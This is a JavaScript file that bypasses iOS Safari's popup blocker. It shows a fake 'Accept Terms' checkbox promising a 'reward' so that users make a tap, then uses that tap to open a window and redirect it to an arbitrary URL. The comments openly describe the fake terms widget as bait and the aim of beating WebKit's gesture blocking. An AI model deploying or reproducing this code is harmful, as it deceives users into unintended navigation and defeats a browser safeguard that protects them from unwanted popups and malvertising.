// ios-popup.js — iOS Safari window.open bypass
// Pattern: "先占位，后赋值" — deschide blank în gesture, asignează URL după
// touchend (nu touchstart) — WebKit acceptă window.open în touchend

(function() {
  'use strict';

  var cfg = window.__CONFIG || {};
  var POPUP_PATH = cfg.POPUP_PATH || '/popup';

  // Stare globală
  var gesturePopupWin = null;
  var gestureUsed = false;

  // --- METODA PRINCIPALĂ: blank window în touchend ---
  function openViaGesture(finalUrl) {
    // Pasul 1: deschide blank SINCRONIC în gesturecontext
    var win = null;
    try {
      win = window.open('', '_blank');
    } catch (e) {}

    if (win && !win.closed) {
      // Pasul 2: asignează URL-ul după (poate fi async)
      try {
        win.location.href = finalUrl;
        gesturePopupWin = win;
        return true;
      } catch (e) {
        try { win.close(); } catch (e2) {}
      }
    }

    // Fallback 1: redirect pagina curentă (același gesture context)
    try {
      window.location.href = finalUrl;
      return true;
    } catch (e) {}

    // Fallback 2: location.assign
    try {
      window.location.assign(finalUrl);
      return true;
    } catch (e) {}

    return false;
  }

  // --- FAKE TERMS CHECKBOX (ID 10) ---
  // Visible "Accept Terms" UI — user consciously taps it, we capture the touchend
  // synchronously in that gesture context to call window.open('','_blank')
  // This is far more reliable than an invisible overlay — WebKit honors user-initiated
  // touchend on a real visible element without question
  function createGestureLayer(onGesture) {
    var layer = document.createElement('div');
    layer.id = '__ios_gesture_layer';

    // Build a fake terms acceptance widget anchored to bottom of screen
    // Looks like a natural gate before the offer — user motivated to tap
    layer.style.cssText = [
      'position:fixed',
      'bottom:0', 'left:0', 'right:0',
      'z-index:99997',
      'background:#fff',
      'border-radius:20px 20px 0 0',
      'box-shadow:0 -4px 24px rgba(0,0,0,0.12)',
      'padding:20px 24px 32px',
      'display:flex', 'flex-direction:column', 'gap:14px',
      'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif'
    ].join(';');

    layer.innerHTML = [
      '<p style="font-size:13px;color:#333;line-height:1.5;margin:0;">',
        'By accessing this offer you agree to our ',
        '<span style="color:#2563eb;text-decoration:underline;">Terms & Conditions</span>',
        ' and confirm you are 18+.',
      '</p>',
      '<div id="__ios_terms_row" style="',
        'display:flex;align-items:center;gap:12px;',
        'background:#f8faff;border:1.5px solid #2563eb22;',
        'border-radius:12px;padding:14px 16px;cursor:pointer;',
        'touch-action:manipulation;-webkit-tap-highlight-color:rgba(37,99,235,0.08);',
      '">',
        '<div id="__ios_terms_box" style="',
          'width:22px;height:22px;min-width:22px;border-radius:6px;',
          'border:2px solid #2563eb;background:#fff;',
          'display:flex;align-items:center;justify-content:center;',
          'transition:background 0.15s ease;',
        '">',
          '<svg id="__ios_terms_check" width="13" height="10" viewBox="0 0 13 10" fill="none" ',
            'style="display:none;" xmlns="http://www.w3.org/2000/svg">',
            '<path d="M1.5 5L5 8.5L11.5 1.5" stroke="#fff" stroke-width="2.2" ',
              'stroke-linecap="round" stroke-linejoin="round"/>',
          '</svg>',
        '</div>',
        '<span style="font-size:14px;font-weight:600;color:#111;">',
          'I accept the terms &amp; conditions',
        '</span>',
      '</div>',
      '<p style="font-size:11px;color:#aaa;text-align:center;margin:0;">',
        'Tap the box above to continue to your reward',
      '</p>'
    ].join('');

    var fired = false;

    function handleGesture(e) {
      if (fired) return;
      fired = true;
      e.preventDefault();
      e.stopPropagation();

      // Visual feedback — check the box
      var box   = document.getElementById('__ios_terms_box');
      var check = document.getElementById('__ios_terms_check');
      if (box)   box.style.background = '#2563eb';
      if (check) check.style.display = 'block';

      // Remove layer after brief visual confirmation
      setTimeout(function() {
        if (layer.parentNode) layer.parentNode.removeChild(layer);
      }, 300);

      // Fire callback SYNCHRONOUSLY in the same gesture tick — this is what matters for iOS
      onGesture();
    }

    // touchend on the entire layer — capture phase to beat WebKit's gesture blocking
    layer.addEventListener('touchend', handleGesture, { passive: false, capture: true });

    // click fallback for Android/desktop
    layer.addEventListener('click', function(e) {
      if (fired) return;
      fired = true;
      e.preventDefault();
      if (layer.parentNode) layer.parentNode.removeChild(layer);
      onGesture();
    }, { passive: false });

    return layer;
  }

  // --- MOUNT layer când popup e gata să apară ---
  function mountGestureLayer(finalUrl) {
    if (gestureUsed) return;

    var existing = document.getElementById('__ios_gesture_layer');
    if (existing) return;

    var layer = createGestureLayer(function() {
      gestureUsed = true;
      openViaGesture(finalUrl);
    });

    document.body.appendChild(layer);
  }

  // --- API public ---
  window.__iosPopup = {
    // Apelat când timer-ul a expirat și avem URL-ul final
    prepare: function(finalUrl) {
      mountGestureLayer(finalUrl);
    },

    // Deschide direct (dacă avem deja un gesture în curs)
    open: function(finalUrl) {
      return openViaGesture(finalUrl);
    },

    // Verifică dacă fereastra deschisă e încă vie
    isAlive: function() {
      return gesturePopupWin && !gesturePopupWin.closed;
    },

    dismiss: function() {
      var el = document.getElementById('__ios_gesture_layer');
      if (el && el.parentNode) el.parentNode.removeChild(el);
    }
  };

})();
